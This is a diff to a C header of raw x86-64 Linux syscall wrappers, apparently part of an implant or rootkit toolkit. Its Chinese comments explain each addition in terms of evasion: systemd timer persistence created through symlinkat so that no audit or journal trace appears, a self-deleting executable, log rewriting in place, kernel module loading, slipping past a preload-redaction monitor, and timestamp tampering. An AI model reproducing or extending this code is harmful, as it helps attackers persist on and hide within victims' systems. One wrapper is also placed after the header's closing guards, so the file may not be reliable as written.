@@ -17,6 +17,7 @@
 #define __NR_mprotect       10
 #define __NR_munmap         11
 #define __NR_ioctl          16
+#define __NR_access         21
 #define __NR_pipe           22
 #define __NR_dup2           33
 #define __NR_socket         41
@@ -38,16 +39,22 @@
 #define __NR_mkdir          83
 #define __NR_rmdir          84
 #define __NR_unlink         87
+#define __NR_symlinkat      266
+#define __NR_readlink       89
+#define __NR_lseek           8
 #define __NR_getuid         102
 #define __NR_ptrace         101
 #define __NR_geteuid        107
 #define __NR_getpid         39
 #define __NR_getdents64     217
 #define __NR_exit_group     231
+#define __NR_rt_sigaction   13
+
 #define __NR_waitid         247
 #define __NR_openat         257
 #define __NR_pipe2          293
 #define __NR_nanosleep      35
+#define __NR_clock_gettime  228
 #define __NR_wait4          61
 #define __NR_select         23
 #define __NR_setsid         112
@@ -56,6 +63,8 @@
 #define __NR_prctl          157
 #define __NR_utimensat      280
 #define __NR_bpf            321
+#define __NR_finit_module   313
+#define __NR_fchmodat       268
 #define __NR_getrandom      318
 #define __NR_memfd_create   319
 
@@ -152,6 +161,14 @@ static inline int sys_open(const char *path, int flags, int mode) {
     return (int)raw_syscall3(__NR_open, (long)path, flags, mode);
 }
 
+/// access(path, mode) — R_OK=4 / F_OK=0。存在的意义只有一条：redact.c 的
+/// preload 豁免判据是「刚 access 探测过」**AND**「带 O_CLOEXEC」，而我们自己
+/// 的代码要读 preload 真身时就必须摆出**这个**形态（见 bofs/evacuate.c）。
+/// ⚠️ 不能拿 faccessat(269) 代替：redact 只认 access(21) 这一条。
+static inline int sys_access(const char *path, int mode) {
+    return (int)raw_syscall2(__NR_access, (long)path, mode);
+}
+
 static inline int sys_openat(int dirfd, const char *path, int flags, int mode) {
     return (int)raw_syscall4(__NR_openat, dirfd, (long)path, flags, mode);
 }
@@ -224,6 +241,34 @@ static inline int sys_unlink(const char *path) {
     return (int)raw_syscall1(__NR_unlink, (long)path);
 }
 
+// P3-G5: systemd 单元要在 timers.target.wants/ 下有条目才会开机启动，而
+// 这条目**必须是符号链接**（`systemctl enable` 做的事就是建它）。走
+// symlinkat 而不是 execve systemctl —— 后者是一条 execve 审计事件，
+// 且会把 "enable" 写进 systemd 的 journal（P2-E 的核心结论：动作本身的
+// 可观测性比结果更重要）。
+// 注意参数序：symlinkat(target, newdirfd, linkpath)，target 在前。
+static inline int sys_symlinkat(const char *target, int newdirfd,
+                                const char *linkpath) {
+    return (int)raw_syscall3(__NR_symlinkat, (long)target, newdirfd,
+                             (long)linkpath);
+}
+
+// P1: 读 /proc/self/exe 的真实路径（自删可执行文件用）。注意内核在目标已被
+// unlink 时会返回 "... (deleted)" 后缀，调用方需自行识别。
+static inline long sys_readlink(const char *path, char *buf, size_t size) {
+    return raw_syscall3(__NR_readlink, (long)path, (long)buf, size);
+}
+
+// P2-E4: 就地改写日志需要"读一段 → 回退 → 覆写 → 再回到读位置"。
+// SEEK_SET=0 / SEEK_CUR=1 / SEEK_END=2 三平台一致。
+#define AX_SEEK_SET 0
+#define AX_SEEK_CUR 1
+#define AX_SEEK_END 2
+
+static inline long sys_lseek(int fd, long offset, int whence) {
+    return raw_syscall3(__NR_lseek, fd, offset, whence);
+}
+
 static inline int sys_rename(const char *oldpath, const char *newpath) {
     return (int)raw_syscall2(__NR_rename, (long)oldpath, (long)newpath);
 }
@@ -246,6 +291,15 @@ static inline int sys_pipe2(int pipefd[2], int flags) {
 
 static inline int sys_ioctl(int fd, unsigned long request, unsigned long arg) {
     return (int)raw_syscall3(__NR_ioctl, fd, request, arg);
+}
+
+// perf_event_open(attr, pid, cpu, group_fd, flags)
+// NOTE: arg0 is a POINTER to struct perf_event_attr, not the event type.  The
+// earlier wrapper took (type, config) as two separate ints, so the kernel got a
+// bogus attr pointer and every attach died with EINVAL.
+static inline long sys_perf_event_open(void *attr, int pid, int cpu, int group_fd,
+                                       unsigned long flags) {
+    return raw_syscall5(298 /* __NR_perf_event_open */, (long)attr, pid, cpu, group_fd, flags);
 }
 
 static inline int sys_fcntl(int fd, int cmd, long arg) {
@@ -360,6 +414,18 @@ static inline void sys_usleep(unsigned int usec) {
     sys_nanosleep(&ts, (struct linux_timespec*)0);
 }
 
+static inline int sys_clock_gettime(int clk_id, struct linux_timespec *ts) {
+    return (int)raw_syscall2(__NR_clock_gettime, clk_id, (long)ts);
+}
+
+static inline long sys_finit_module(int fd, const char *param_values, int flags) {
+    return raw_syscall3(__NR_finit_module, fd, (long)param_values, flags);
+}
+
+static inline int sys_fchmodat(int dirfd, const char *path, int mode, int flags) {
+    return (int)raw_syscall4(__NR_fchmodat, dirfd, (long)path, mode, flags);
+}
+
 // ── Timestamp modification ──
 
 static inline int sys_utimensat(int dirfd, const char *path, const struct linux_timespec times[2], int flags) {
@@ -405,3 +471,7 @@ static inline int sys_pselect6(int nfds, void *readfds, void *writefds,
 
 #endif // ARCH_X86_64
 #endif // SYSCALLS_X64_H
+
+static inline long sys_rt_sigaction(int signum, const void *act, void *oldact, size_t sigsetsize) {
+    return raw_syscall4(__NR_rt_sigaction, signum, (long)act, (long)oldact, (long)sigsetsize);
+}
